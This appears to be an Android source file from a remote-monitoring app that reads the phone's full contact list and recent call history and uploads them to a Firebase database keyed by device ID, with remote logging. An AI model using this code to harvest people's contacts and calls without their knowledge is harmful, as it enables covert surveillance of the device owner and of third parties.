package com.remoteguard.app

import android.Manifest
import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object ContactsAndCallsManager {

    data class Contact(
        val name: String,
        val phone: String,
        val email: String = ""
    )

    data class CallLogEntry(
        val name: String,
        val phone: String,
        val type: String,
        val duration: Long,
        val timestamp: Long
    )

    fun getContacts(context: Context) {
        try {
            Log.d("ContactsAndCallsManager", "Fetching contacts...")
            if (!hasContactsPermission(context)) {
                Log.w("ContactsAndCallsManager", "Contacts permission not granted")
                FirebaseHelper.logRemote("ContactsAndCallsManager", "Contacts permission not granted", false)
                return
            }

            val contacts = mutableListOf<Contact>()
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                ),
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    try {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))

                        // Get email if available
                        val email = getContactEmail(context, contactId)

                        if (phone.isNotEmpty()) {
                            contacts.add(Contact(name, phone, email))
                        }
                    } catch (e: Exception) {
                        Log.w("ContactsAndCallsManager", "Error parsing contact: ${e.message}")
                    }
                }
            }

            Log.d("ContactsAndCallsManager", "Found ${contacts.size} contacts")
            saveContactsToFirebase(context, contacts)
        } catch (e: Exception) {
            Log.e("ContactsAndCallsManager", "Error fetching contacts: ${e.message}", e)
            FirebaseHelper.logRemote("ContactsAndCallsManager", "Error fetching contacts: ${e.message}", true)
        }
    }

    fun getCallHistory(context: Context) {
        try {
            Log.d("ContactsAndCallsManager", "Fetching call history...")
            if (!hasCallLogsPermission(context)) {
                Log.w("ContactsAndCallsManager", "Call logs permission not granted")
                FirebaseHelper.logRemote("ContactsAndCallsManager", "Call logs permission not granted", false)
                return
            }

            val calls = mutableListOf<CallLogEntry>()
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE
                ),
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 200"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    try {
                        val name = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                        val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                        val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))

                        val typeStr = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            else -> "UNKNOWN"
                        }

                        if (number.isNotEmpty()) {
                            calls.add(CallLogEntry(name, number, typeStr, duration, date))
                        }
                    } catch (e: Exception) {
                        Log.w("ContactsAndCallsManager", "Error parsing call entry: ${e.message}")
                    }
                }
            }

            Log.d("ContactsAndCallsManager", "Found ${calls.size} call logs")
            saveCallHistoryToFirebase(context, calls)
        } catch (e: Exception) {
            Log.e("ContactsAndCallsManager", "Error fetching call history: ${e.message}", e)
            FirebaseHelper.logRemote("ContactsAndCallsManager", "Error fetching call history: ${e.message}", true)
        }
    }

    private fun getContactEmail(context: Context, contactId: String): String {
        return try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Email.DATA),
                "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                arrayOf(contactId),
                null
            )

            var email = ""
            cursor?.use {
                if (it.moveToFirst()) {
                    email = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA))
                }
            }
            email
        } catch (e: Exception) {
            Log.w("ContactsAndCallsManager", "Error getting email: ${e.message}")
            ""
        }
    }

    private fun hasContactsPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CONTACTS
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun hasCallLogsPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CALL_LOG
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun saveContactsToFirebase(context: Context, contacts: List<Contact>) {
        try {
            val id = FirebaseHelper.getDeviceId(context)
            val database = FirebaseDatabase.getInstance()
            val contactsList = contacts.take(500).map { contact ->
                mapOf(
                    "name" to contact.name,
                    "phone" to contact.phone,
                    "email" to contact.email
                )
            }

            database.getReference("devices/$id/contacts").setValue(contactsList)
                .addOnSuccessListener {
                    Log.d("ContactsAndCallsManager", "Contacts saved to Firebase: ${contacts.size} contacts")
                    FirebaseHelper.logRemote("ContactsAndCallsManager", "Contacts synced: ${contacts.size} contacts")
                }
                .addOnFailureListener { e ->
                    Log.e("ContactsAndCallsManager", "Failed to save contacts: ${e.message}", e)
                    FirebaseHelper.logRemote("ContactsAndCallsManager", "Failed to save contacts: ${e.message}", true)
                }
        } catch (e: Exception) {
            Log.e("ContactsAndCallsManager", "Error saving contacts: ${e.message}", e)
        }
    }

    private fun saveCallHistoryToFirebase(context: Context, calls: List<CallLogEntry>) {
        try {
            val id = FirebaseHelper.getDeviceId(context)
            val database = FirebaseDatabase.getInstance()
            val callsList = calls.take(200).map { call ->
                mapOf(
                    "name" to call.name,
                    "phone" to call.phone,
                    "type" to call.type,
                    "duration" to call.duration,
                    "timestamp" to call.timestamp
                )
            }

            database.getReference("devices/$id/callHistory").setValue(callsList)
                .addOnSuccessListener {
                    Log.d("ContactsAndCallsManager", "Call history saved to Firebase: ${calls.size} calls")
                    FirebaseHelper.logRemote("ContactsAndCallsManager", "Call history synced: ${calls.size} calls")
                }
                .addOnFailureListener { e ->
                    Log.e("ContactsAndCallsManager", "Failed to save call history: ${e.message}", e)
                    FirebaseHelper.logRemote("ContactsAndCallsManager", "Failed to save call history: ${e.message}", true)
                }
        } catch (e: Exception) {
            Log.e("ContactsAndCallsManager", "Error saving call history: ${e.message}", e)
        }
    }
}
